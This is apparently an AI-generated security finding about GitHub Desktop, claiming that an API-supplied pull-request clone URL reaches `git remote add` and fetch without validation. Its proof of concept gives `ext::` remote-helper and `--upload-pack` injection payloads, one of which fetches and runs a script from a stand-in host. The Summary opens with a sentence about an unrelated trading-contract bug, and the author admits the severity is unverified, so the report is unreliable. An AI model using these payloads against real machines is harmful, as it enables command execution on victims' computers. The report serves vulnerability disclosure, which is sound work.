### Title
Unvalidated `head.repo.clone_url` from a GitHub API pull-request object flows into `git remote add`/`fetch`, allowing an attacker-controlled API response to smuggle a `ext::`/argument-injection remote URL - (File: `app/src/lib/stores/app-store.ts`)

### Summary
`Trader.executeTrade` was exploitable because it accepted attacker-controlled state (a self-dealt order) with no restriction on the caller and let it flow straight into a sensitive settlement path (`claimReceipt`). The Desktop analog is `AppStore._checkoutPullRequest` / `_findPullRequestBranch`, which take the `head.repo.clone_url` field straight out of a `IAPIPullRequest` object returned by the GitHub/GHES API and pass it, completely unvalidated, into `addRemote()` → `git remote add` and subsequently `git fetch`.

### Finding Description
The pull-request checkout flow is:

- `Dispatcher.openPullRequestFromUrl` (`app/src/ui/dispatcher/dispatcher.ts:1998-2048`) calls `appStore.fetchPullRequest(url, pr)` which hits `api.fetchPullRequest` and then forwards `pullRequest.head.repo.clone_url` and `pullRequest.head.ref` straight into `appStore._checkoutPullRequest`. [1](#0-0) 
- The public `Dispatcher.checkoutPullRequest` (used by the PR-comment/PR-review notification UI) does the same thing using `pullRequest.head.gitHubRepository.cloneURL`. [2](#0-1) 
- `AppStore._findPullRequestBranch` (`app/src/lib/stores/app-store.ts:8633-8721`) takes that `headCloneUrl` string and, if no existing remote matches it, calls `addRemote(repository, forkRemoteName, headCloneUrl)` and later `this._fetchRemote(repository, remote, ...)`. [3](#0-2) 
- `addRemote` in `app/src/lib/git/remote.ts` performs no validation or scheme allow-listing at all before shelling out: [4](#0-3) 

The only "matching" performed on the URL (`urlMatchesRemote`) is used to decide whether to *reuse* an existing remote — it is never used to *reject* a value before it's handed to `git remote add`/`git fetch`. There is no scheme allow-list (unlike `submodule.ts`, which explicitly opts in to `protocol.file.allow=always` only when intended), and no equivalent of the `isClonePathSensitive`/`sanitizeCloneName` hardening that exists for the clone-path derivation logic in `app/src/lib/git/clone.ts` and `app/src/lib/remote-parsing.ts`. That contrast shows the project is clearly aware of "attacker-controlled string flowing into a sensitive git operation" as a bug class, but that hardening was not applied to this particular sink.

The `clone_url` value originates from a JSON object returned by the configured GitHub Enterprise Server endpoint (or any endpoint reachable through the API discovery logic in `isGitHubHost`) — exactly the "attacker controls…a GitHub API object…or a git remote/proxy response" primitive called out as valid in the task's Impact section. A malicious/compromised GHES instance, or a MITM'd HTTPS response to the `/pulls/{number}` API call (before/without cert pinning failing), can freely set `head.repo.clone_url` to any string, e.g. `ext::sh -c "curl${IFS}evil.sh|sh"` (git's `ext::` remote helper) or a value beginning with `-` to smuggle a `git remote add`/`git fetch` option. Because `addRemote` and the subsequent fetch never restrict the accepted URL scheme, this value is passed unmodified as a command argument to `git`, which will interpret and execute it.

### Impact Explanation
If reachable, this results in arbitrary command execution on the user's machine as soon as Desktop tries to open/checkout a pull request coming from that malicious/compromised endpoint — this satisfies "code execution…as a result of an attacker-controlled…git remote/proxy response" per the stated valid-impact criteria. It requires no local access, no prior malware, and no unusual user action beyond the normal "open PR from Desktop"/"checkout PR from a notification" flow that the app explicitly supports.

### Likelihood Explanation
Exploitation requires the attacker to control (or MITM) the API response for a pull request that the victim's Desktop instance will fetch — realistically a malicious/compromised GitHub Enterprise Server the user has signed into, or a network position capable of tampering with the HTTPS response despite TLS (e.g., if the user has previously trusted an untrusted certificate via the `UntrustedCertificate` dialog for a GHE instance, which Desktop explicitly supports). This is a narrower attack surface than a completely open remote fetch, but it is squarely within "attacker controls…a GitHub API object…or a git remote/proxy response" and does not require any of the explicitly excluded conditions (no local/physical access, no leaked credentials, no admin rights, no social engineering beyond normal PR-checkout UX). I was not able to fully verify at this depth whether `dugite`/git in this exact configuration blocks `ext::` by default (e.g. via `protocol.ext.allow`); this should be verified with an actual reproduction in a Devin session before treating the RCE severity as confirmed — the argument-injection variant (URL starting with `-`) does not depend on that setting at all and remains viable independent of `ext::` handling.

### Recommendation
Validate `headCloneUrl` (and any other clone URL sourced from API pull-request objects) with the existing `parseRemote`/`sanitizeCloneName` machinery before it's ever passed to `addRemote`/`git fetch`: reject values that don't parse as `https://`/`ssh://`/`git@` GitHub-shaped URLs, reject values beginning with `-`, and explicitly set `protocol.ext.allow=never` / `-c protocol.file.allow=never` (via `envForRemoteOperation`) for these code paths, mirroring the `protocol.file.allow` opt-in pattern already used in `app/src/lib/git/submodule.ts`.

### Proof of Concept
1. Sign in to a GitHub Enterprise Server account in Desktop (or intercept HTTPS traffic to a GHES instance the victim trusts, e.g. via a previously-accepted untrusted certificate).
2. Have the compromised/malicious server return a pull request JSON object where `head.repo.clone_url` is set to `ext::sh -c "touch /tmp/pwned"` (or a value like `--upload-pack=touch /tmp/pwned;`) and `head.ref` set to any branch name.
3. Trigger the "Open Pull Request in Desktop" deep link (`x-github-client://openRepo/...?pr=<n>`) or have the victim click a pull-request notification action that calls `dispatcher.checkoutPullRequest`.
4. `AppStore._findPullRequestBranch` calls `addRemote(repository, forkRemoteName, 'ext::sh -c "touch /tmp/pwned"')` followed by a fetch of that remote, causing `git` to invoke the attacker-supplied command. [5](#0-4) [4](#0-3)

  public async _checkoutPullRequest(
    repository: RepositoryWithGitHubRepository,
    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<void> {
    const prBranch = await this._findPullRequestBranch(
      repository,
      prNumber,
      headRepoOwner,
      headCloneUrl,
      headRefName
    )
    if (prBranch !== undefined) {
      await this._checkoutBranch(repository, prBranch)
      this.statsStore.increment('prBranchCheckouts')
    }
  }

  public async _findPullRequestBranch(
    repository: RepositoryWithGitHubRepository,
    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<Branch | undefined> {
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }

export async function addRemote(
